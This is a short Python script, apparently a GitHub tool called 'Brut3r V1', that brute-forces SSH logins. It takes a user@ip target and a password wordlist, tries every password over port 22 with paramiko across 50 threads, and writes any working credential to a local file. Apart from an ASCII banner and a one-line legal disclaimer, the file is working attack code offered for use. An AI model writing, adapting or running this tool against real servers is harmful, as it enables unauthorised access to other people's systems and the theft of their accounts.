import paramiko
from multiprocessing.dummy import Pool
import sys
print("""

 /$$$$$$$                        /$$      /$$$$$$                  /$$    /$$   /$$
| $$__  $$                      | $$     /$$__  $$                | $$   | $$ /$$$$
| $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$  |__/  \ $$  /$$$$$$       | $$   | $$|_  $$
| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/     /$$$$$/ /$$__  $$      |  $$ / $$/  | $$
| $$__  $$| $$  \__/| $$  | $$  | $$      |___  $$| $$  \__/       \  $$ $$/   | $$
| $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$  \ $$| $$              \  $$$/    | $$
| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$/| $$               \  $/    /$$$$$$
|_______/ |__/       \______/    \___/   \______/ |__/                \_/    |______/

                                Created By Saber Sebri
				github.com/sab3rsebri

"""
)
print("The author does not hold any responsibility for the bad use of this tool, remember that attacking targets without prior consent is illegal and punished by law.\n")
try :
	wordlist = sys.argv[2]
	data = sys.argv[1]
except :
	print("Usage : python3 "+sys.argv[0]+ " user@ip "+ "WordlistFile")
	quit()
host = data.split('@')[1]
username=data.split('@')[0]
th = int(input("Threads ? : "))
def brute(password):
	port = 22
	pasw = password
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try :
		ssh.connect(host, port, username, pasw)
		print("Password Found : "+pasw)
		with open('Brut3rV1.txt', 'a') as oo:
			oo.write(data+':'+pasw+'\n')
			exit()
	except:
		print(password, "Failed")
		pass

if __name__ == '__main__':
	print("Host : "+host)
	print("Username : "+username)
	with open(wordlist, 'r', errors="ignore") as (f):
		passww = f.read().split('\n')
		ThreadPool = Pool(50)
		Threads = ThreadPool.map(brute, passww)
